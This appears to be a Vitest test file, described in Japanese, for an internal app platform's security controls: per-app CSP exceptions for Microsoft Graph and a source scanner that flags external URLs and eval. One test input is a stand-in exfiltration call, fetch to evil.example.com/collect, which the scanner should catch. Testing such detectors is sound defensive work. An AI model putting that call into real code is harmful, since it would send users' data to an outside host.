import { describe, expect, it } from 'vitest';
import { CAPABILITIES, capabilitiesFor, loadAppCapabilities } from './capabilities.mjs';
import { scanSource } from './check-safety.mjs';
import { CSP, toSwaConfig } from './manifests.mjs';

const manifest = { name: 'x', description: 'x', category: 'サポート', owner: 'x', status: 'available', access: ['authenticated'] };
const apps = [
  { dept: 'cp', app: 'tasukuri', manifest },
  { dept: 'bm', app: 'equipment', manifest },
];
const caps = { 'cp-tasukuri': ['microsoft-graph-mail', 'platform-api'] };

describe('アプリごとの例外（ケイパビリティ）', () => {
  it('登録ファイルの名前はすべて定義済み', () => {
    const map = loadAppCapabilities();
    for (const list of Object.values(map)) for (const c of list) expect(CAPABILITIES[c]).toBeDefined();
  });

  it('許可されたアプリだけ、CSP に Microsoft の通信先が追加され、API のルートができる', () => {
    const { routes } = toSwaConfig(apps, caps);
    const taskuri = routes.find((r) => r.route === '/cp/tasukuri/*');
    expect(taskuri.headers['Content-Security-Policy']).toContain('connect-src \'self\' https://graph.microsoft.com https://login.microsoftonline.com');
    expect(routes.find((r) => r.route === '/bm/equipment/*').headers).toBeUndefined();
    expect(routes.find((r) => r.route === '/api/cp-tasukuri/*').allowedRoles).toEqual(['authenticated']);
    expect(routes.findIndex((r) => r.route === '/api/cp-tasukuri/*')).toBeLessThan(routes.findIndex((r) => r.route === '/*'));
  });

  it('標準の CSP は変わらない（外部への送信は禁止のまま）', () => {
    expect(CSP).toContain("connect-src 'self';");
    expect(CSP).toContain("frame-src 'none'");
  });

  it('禁止パターン：許可されたホストへの通信だけを見逃し、それ以外の外部URLは検出する', () => {
    const allow = capabilitiesFor('cp-tasukuri', caps);
    expect(scanSource("await fetch('https://graph.microsoft.com/v1.0/me')", allow)).toEqual([]);
    expect(scanSource("await fetch('https://evil.example.com/collect')", allow).map((f) => f.rule)).toEqual(['external-url']);
    expect(scanSource('eval(x)', allow).map((f) => f.rule)).toEqual(['eval']);
    // 例外のないアプリは従来どおり
    expect(scanSource("await fetch('https://graph.microsoft.com/v1.0/me')").map((f) => f.rule)).toEqual(['external-url', 'network']);
  });
});
